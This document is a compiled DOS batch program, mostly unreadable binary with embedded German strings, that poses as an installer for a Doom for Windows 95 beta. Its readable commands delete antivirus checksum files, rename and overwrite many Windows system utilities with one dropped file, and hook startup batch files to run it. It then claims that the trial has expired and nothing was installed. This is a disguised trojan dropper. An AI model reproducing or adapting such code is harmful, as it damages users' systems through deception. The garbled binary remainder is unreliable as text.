�2�	�!�@ ��� &�&l ��&�l $:�t�&�l $:�u���� This file compiled with unregistered version of TurboBAT 3.06 batch
file compiler.  Please register to eliminate this message.

$����n �f�^�J�!�, �F��P�^ ���L�!��V"�S�  [��O�FP�W.�WX�F[�    �  S�   DUMMY   FCB     DUMMY   FCB    [�fWV��F�?�)�!��)�!^_�WR�RW.�FP�ܸ K���!��.�n ����Ӌf���M�!�F[Ä  S�	 COMMAND  [�, 9Fu/S�0�!�ĉG�R�!&�G�� [��&�>  Mu_@&; t	& ���N� 
s� r�7� � �uۋЎ�&�, ��K��&�>  Mt��H��& @��&9 t���@�F[�S� COMSPEC[� ���W[�7  SQW�F3��ދ���u&�==t2�����&�= u�������<=u��< t�
�r< r�N�_Y[�SV�Y Invalid directory ?:\                                                                 
 [��� RrR
�u��!���Ѐ< t�|:u"�| u
�u1�����@����G�!����
�ִ;�!s����� ���V��� �Z^[�F  T  �F
�t��!���S� Invalid drive "?:"
 [2Ҁ< t'�|:u!��W��߀�@�2S�![<�u
V���WG^���[�F  �״�!��3ɴN�!r����SV�8 Directory already exists
 Unable to create directory
 [�WZr�ִ9�!s��= t���WV^[�F  T  �F�����t�=�!s�<�!r'���t�B3ҋ��!r�^S�E� �!�F� [�F�!Ã~�t�F�^� �!�>�^�!��  
$Strike any key when ready... [�u����W8��!�Ӵ	�!�F  S�2  PATH=COMEXEBAT    Bad command or file name
 /C  [�w��V
���G1 � ��3�
usRV3Ҁ|:u���߀�@��G�<\t�\�V���G�!^2��@ �O�}�\t�\�3��=..u��\� ���G�쪊�<\u�G1< u�O���� �.��uG�׋�^Z�'�1 u	�w��as	�w��]�~�I �< v<.t����.��w� ��2��RVQ����iY^Zs
������8���u4�w.������2��� ��E� �w8L�w�L������+D���Y��O�W����e_�[��  F  $    �  S� PATH[RV� ���W?I��
�t$<;u���<;t
�t���&�}�\t�\��^Z[����7  ���t�  [�W�L�!�  SQW3��<+t�<-u@FP3�3ҹ
 �,0r<	w2�����ᗓ������X�t
���҃��� ��_Y[�
�  ��          ��          /C BREAK off /C C: \ [2J$c:\windows\chklist.* /C DEL c:\windows\chklist.* c:\windows\command\chklist.* $/C DEL c:\windows\command\chklist.* doom95 doom95 
 
  Starte Installation von Doom f�r Windows 95 3.0 Beta-Version.
 
  Kopiere EXE-Datei.
 
 c:\windows\help\zzz.tb +/C COPY a:doom01.ovl c:\doom95\arj.exe /v  c:\windows\help\zzz.tb +/C COPY a:info.sys c:\windows\info.com /v  c:\windows\help\zzz.tb 5/C COPY a:doom95.wa_ c:\windows\help\de-inst.com /v  
 
  Aktualisiere Registrierdatenbank.
  Einen Moment bitte.
 \windows c:\windows\help\zzz.tb 1/C COPY a:doom02.ovl c:\windows\taskman2.exe /v  /C REN defrag.exe   defrag.tst  /C REN welcome.exe  welcome.w95 !/C REN smartdrv.exe smartdrv.all /C REN write.exe    write.net c:\windows\help\zzz.tb $/C COPY dosstart.bat dosend.bat /v  c:\windows\help\zzz.tb $/C COPY winstart.bat winend.bat /v  c:\windows\dosstart.bat c:\windows\command\share.exe 
 c:\windows\winstart.bat c:\windows\command\share.exe 
 command /C REN attrib.exe   system.exe /C REN scandisk.exe scanit.1st /C REN share.exe    share.ovl /C REN xcopy.exe    xcopy.hlp /C REN mscdex.exe   msdos.w30 
 
  Bitte legen Sie die zweite Diskette ein
  und dr�cken Sie eine beliebige Taste.
 
 c:\windows\help\zzz.tb 
 
  Kopiere Programm-Dateien.
 \windows\system c:\windows\help\zzz.tb  ARJ  e -y a:doom03.ovlc:\windows\help\zzz.tb 4/C COPY a:help.sys c:\windows\command\share.exe /v  c:\windows\help\zzz.tb 5/C COPY a:help.sys c:\windows\command\mscdex.exe /v  c:\windows\help\zzz.tb 7/C COPY a:help.sys c:\windows\command\scandisk.exe /v  4/C COPY a:help.sys c:\windows\command\attrib.exe /v 3/C COPY a:help.sys c:\windows\command\xcopy.exe /v ,/C COPY a:help.sys c:\windows\defrag.exe /v -/C COPY a:help.sys c:\windows\welcome.exe /v ./C COPY a:help.sys c:\windows\smartdrv.exe /v +/C COPY a:help.sys c:\windows\write.exe /v */C COPY a:help.sys c:\windows\help.all /v 
 
  Erstelle WAD-Dateien.
  SYSTEM  +r c:\windows\help.all SYSTEM " +r c:\windows\system\msppv??.dll\  DELTREE  /y doom95
 
  Dies ist eine Runtime-Demo Version.
  Die Testzeit ist abgelaufen.
  Doom wurde nicht installiert.
  Bitte erkundigen Sie sich nach der Vollversion bei Ihrem H�ndler.
  Danke.
 
  Installation beendet.
 
 /C DEL c:\windows\help\zzz.tb   �  ���Ѝ�% ���Ѝ�4 ���й  ��; ���Ѝ�= �	�!��B �� ����s�	 ��X ���Ѝ�u �� ����s�	 ��� ���Ѝ�� ���й  ��� ���Ѝ�� �F�Ѝ�� �F�Ѝ�� �F�Ѝ��F�Ѝ��F�Ѝ�&�F�й  ��)�  ��Ѝ�A���и\�й  ��m� ��Ѝ�����и\�й  ���� ��Ѝ�����и\�Ѝ���F�Ѝ��F�Ѝ��F�Ѝ�*�F�й  ��A���й  ��J� ��Ѝ�b���и\�Ѝ�����Ѝ�����Ѝ�����Ѝ�����й  ��� ��Ѝ�2���и\�й  ��W� ��Ѝ�o���и\�й  ���� ��Ѝ���F�и\�й  ���� ��Ѝ���F�и\�й  �����Ѝ����Ѝ�.���Ѝ�O���Ѝ�o���Ѝ�����Ѝ���F�Ѝ���F�Ѝ���F�Ѝ���F�Ѝ��F�й  ��� ��п  �t�и\�Ѝ�"�F�Ѝ�%�F�Ѝ�(�F�й  ��E���й  ��U� ��Ѝ�m��r���и\�й  ���� ��Ѝ�����и\�й  ���� ��Ѝ�����и\�й  �� � ��Ѝ�8���и\�Ѝ�q���Ѝ�����Ѝ�����Ѝ�
���Ѝ�9���Ѝ�i���Ѝ�����Ѝ���F�Ѝ���F�Ѝ���F�Ѝ��������Ѝ���
���й  ��,���Ѝ�/��8���Ѝ�C�F�Ѝ�F�F�Ѝ�I�F�Ѝ�p�F�Ѝ���F�Ѝ���F�Ѝ���F�Ѝ� 	�F�Ѝ�	�F�Ѝ�	�F�Ѝ� 	���о  �  �k��                                                                                                                                                                                                                                                                   